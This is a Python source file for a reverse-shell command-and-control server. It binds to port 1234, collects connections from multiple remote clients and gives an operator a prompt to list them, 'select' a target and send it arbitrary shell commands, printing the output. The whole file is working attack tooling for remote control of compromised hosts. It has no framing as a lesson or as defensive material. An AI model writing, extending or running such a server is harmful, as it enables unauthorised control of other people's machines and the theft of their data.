import socket
import threading
import time
from queue import Queue
import sys

# Declaring constants to keep track of the number of threads and jobs
THREADS_NO = 2
JOB_NO = [1, 2]

queue = Queue()

# Declaring two lists to keep track of our connections
connections = []
addresses = []


def socket_create():
    try:
        global host
        global port
        global connection
        host = ''
        port = 1234
        connection = socket.socket()
    except socket.error as sockErr:
        print("Couldn't create socket! " + str(sockErr))


def socket_bind():
    try:
        global host
        global port
        global connection
        print("Binding socket to the port: "+ str(port))
        connection.bind((host, port))
        connection.listen(10)
    except socket.error as sockErr:
        print("socket binding error! " + str(sockErr))
        socket_bind()


# Accept connections from multiple clients and add them to the list
def accept_connections():
    for conn in connections:
        conn.close()
    del connections[:]
    del addresses[:]
    while True:
        try:
            conn, address = connection.accept()
            conn.setblocking(1)
            connections.append(conn)
            addresses.append(address)
            print("\n connection has been established: " + address[0])
        except socket.error as sockErr:
            print("Couldn't accept connection! " + str(sockErr))


# Interactive shell for sending commands remotely
def start_shell():
    while True:
        cmd = input("shell:~$ ")
        if cmd == 'list':
            list_all_connections()
            continue
        if 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
            continue
        else:
            print("command is not recognized")


def list_all_connections():
    result = ' '
    for x, conn in enumerate(connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del connections[x]
            del addresses[x]
            continue
        result += str(x) + ' ' + str(addresses[x][0]) + '  ' + str(addresses[x][1]) + '\n'
    print('---CLIENTS---' + '\n' + result)


# select a target client
def get_target(cmd):
    try:
        target = cmd.replace('select', '')
        target = int(target)
        conn = connections[target]
        print("You are now connected to: " + str(addresses[target][0]))
        print(str(addresses[target][0]) + ":~$ ", end="")
        return conn
    except:
        print("Selection is not valid!")
        return None


# connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "UTF-8")
                print(client_response, end="")
        except:
            print("Error \n"+"connection was lost! ")
            break


def create_threads():
    for _ in range(THREADS_NO):
        th = threading.Thread(target=work)
        th.daemon = True
        th.start()


# this function aims to do the next job in the queue
def work():
    while True:
        x = queue.get()
        if x is 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x is 2:
            start_shell()
        queue.task_done()


def create_jobs():
    for x in JOB_NO:
        queue.put(x)
    queue.join()


create_threads()
create_jobs()
